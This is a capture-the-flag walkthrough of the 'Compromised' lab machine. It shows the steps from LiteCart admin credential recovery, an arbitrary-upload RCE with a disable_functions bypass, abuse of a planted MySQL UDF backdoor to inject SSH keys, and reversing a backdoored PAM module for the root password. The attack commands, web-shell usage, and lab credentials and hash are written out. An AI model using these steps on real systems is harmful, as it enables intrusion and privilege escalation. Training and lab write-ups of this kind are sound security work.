# Compromised - Hard

### Initial recon
After a brief nmap scan we do get only two ports open: ***22*** (ssh) and ***80*** (web). 

### Trying to find a lead. Recon on port 80
When we try to acess `http://compromised.htb/` we get redirected to `/shop` a LiteCart Ecommerce platform. For now we don't have any sets of credentials. So I fired up ***gobuster*** (`gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://compromised.htb/ -x .php,.txt,.html,.zip -o compromised.recon`) and ***nikto*** (`nikto -h "http://compromised.htb"`). Both ended up with `/backup` as an interesting directory to check. Here we can download the archive ***a.tar.gz*** (`curl http://compromised.htb/backup/a.tar.gz -o a.tar.gz`). 

### Forensics on the backup archive
At first we get a decoy that points to an already existing reverse shell (`.sh.php`), which can't be found on the production server. So, I was looking deeper into the files that had the same date or newer than the breach occured ***28 May***. We can see that in the `admin` folder there was a file modified on ***13 September***, the `login.php` file. Here we get a commented snippet of code that was phising user credentials and storing at `./.log2301c9430d8593ae.txt`. 
We got a hit! The file is located at `shop/admin/.log2301c9430d8593ae.txt` which is leaking the admin credentials!

### Foothold
Now that we have the admin credentials we can login into the ACP. Here the version is disclosed (being 2.1.2) which has an `Arbitrary File Upload ` that would eventually lead to `Remote Code Execution`. So we run the script aaaaand booom... we get nothing. What?? Is it something wrong with the shell or? I tried another couple of tricks but nothing. Than I tried to list all ***disabled_functions***, basically all functions that could lead to RCE were disabled.

After a few tries and a lot of headache I ended up finding the `'gc' disable_functions Bypass`. To combine both exploits I decided to read from `shell.php` which contained the exploit and than use `webwrap` to get an actual shell, because aparently all pings were blocked, so I couldn't spawn tty shells. The sequence looks like `python2 exploit.py -u admin -p test -t http://compromised.htb/shop/admin/` than `python3 webwrap.py http://compromised.htb/shop/vqmod/xml/BLXOF.php\?c\=WRAP`.

> ***Note***: I hardcoded the password in the exploit.py and that's why I used `test` instead of `theNextGenSt0r3!~`. Also `BLXOF.php` is the file that you are supposed to pass in, that is located in the same line with `Shell =>`.

# Intended path

### From www-data to mysql

Even though we don't have a complete tty shell, for the next exploit we do need one. After a few tried I've found out that MySQL user can login as a normal one. That was a strange thing to find in `/etc/passwd` so I tried to find some credentials. I headed streight back to `/var/www/html/shop` and started a search using 
`find /var/www/html/shop -newermt "27-May-2020" \! -newermt "29-May-2020" 2>&1 | grep -v "Permission denied"`. From all one file stood up, the `includes/config.inc.php`. Here we can find the database credentials and head streight to enum using `mysql -u root -pchangethis -D information_schema -e "<cmd>"` because I couldn't manage to spawn a tty shell. 

Now after a few tried I found this (article)[https://pure.security/simple-mysql-backdoor-using-user-defined-functions/] that explained how you can backdoor a server using MYSQL UDF (User defined functions). Well, at first I tried to compile my own binary, but after running `mysql -u root -pchangethis -D information_schema -e " select * from mysql.func;"` I ended up finding that the previous hackers already did that and the only thing I was supposed to do was 
`mysql -u root -pchangethis -D information_schema -e " select exec_cmd('whoami')"` and I was mysql.

Not being able to ping my box from inside was a small issue, but I decided to try my luck and insert some ssh keys into the home directory of MySQL user. First, I wanted to make sure that ***authorized_keys*** file was empty and I did `mysql -u root -pchangethis -D information_schema -e " select exec_cmd('echo "" > /var/lib/mysql/.ssh/authorized_keys')"`. The thing was I needed to upload my SSH keys using the LiteCart exploit, so I first needed to change my local file ***shell.php*** into the ***a_shell.php*** than rename ***id_rsa.pub*** into ***shell.php***, run again the `python2 exploit.py -u admin -p test -t http://compromised.htb/shop/admin/` and than just use mysql to inject my key: `mysql -u root -pchangethis -D information_schema -e " select exec_cmd('cat /var/www/html/shop/vqmod/xml/WVDWS.php > /var/lib/mysql/.ssh/authorized_keys')"`. 
Now I can just `ssh -i id_rsa mysql@compromised.htb` and got redundancy.

### From mysql to root

Having a tty shell allowed me to run an enumeration script called (LinPeas)[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS]. Again I needed to upload it using the LiteCart AFU and than move it into the MySQL home directory. There was a thing in the ssh configuration that was not default, `UsePAM no` and the message above him `Set this to 'yes' to enable PAM authentication, account processing,`. So I search into the `/lib` for ***pam_unix.so*** using `find /lib -type f -name pam_unix.so 2>&1 | grep -v "Permission denied"`. The only interesting one was `/lib/x86_64-linux-gnu/security/pam_unix.so`, having also in the same directory `.pam_unix.so`. 

To download this file I moved it into `/var/www/html/` and than `curl http://compromised.htb/pam_unix.so -o pam_unix.so`. I needed to reverse engenieer it and under the `pam` function which has a variable named ***backdoor***  (`backdoor._08 = 0x4533557e656b6c7a; backdoor._87 = 0x2d326d3238766e;`). This decoded as HEX become `-2m28vnE3U~eklz`. Being a binary it's endianness. So I string reversed it and become `zlke~U3Env82m2-`. 

Now I just need to `su root` and `zlke~U3Env82m2-` as password and we pwned!!!

# Unintended way

### From www-data to root
Even though we also need to reverse this binary, and get the password `zlke~U3Env82m2-`, we don't need to bother with privesc to mysql user. Acording to this [article](https://www.sans.org/blog/sneaky-stealthy-su-in-web-shells/) we can ***su*** without needing to have a ***tty shell***. By running the `(sleep 1; echo zlke~U3Env82m2-) | python3 -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"` on the ***webwrap shell*** we get the output "root". Now we can't really get more complex than `(sleep 1; echo zlke~U3Env82m2-) | python3 -c "import pty; pty.spawn(['/bin/su','-c','cat /root/root.txt && cat /home/sysadmin/user.txt']);"` because we can't ping back our box and login with ssh as root or sysadmin. So we can actually redo the whole mysql user ssh from the intended path `(sleep 1; echo zlke~U3Env82m2-) | python3 -c "import pty; pty.spawn(['/bin/su','-c','cat /var/www/html/shop/vqmod/xml/WVDWS.php > /var/lib/mysql/.ssh/authorized_keys')"`. 


### Credentials
- admin:theNextGenSt0r3!~ (Litecart)
- root:changethis (MySQL CLI user)
- $6$lAY5.6eu$m26Pk/KZfbG/KIxgQwSM2W.PuARZt9Qrs2HLNylIuLVIlKe0nyoa2tDk3Kb98JFJDzxfSU0oOoBdGrFhMzOgU0 (root hash)

##### Disabled functions 
```php
<?php
var_dump(ini_get('disable_functions'));
?>
```
Which outputs: 
```php
string(556) "system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,"
```

##### Includes/config.inc.php

```php
define('DB_TYPE', 'mysql');
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'changethis');
define('DB_DATABASE', 'ecom');
define('DB_TABLE_PREFIX', 'lc_');
define('DB_CONNECTION_CHARSET', 'utf8');
define('DB_PERSISTENT_CONNECTIONS', 'false');
```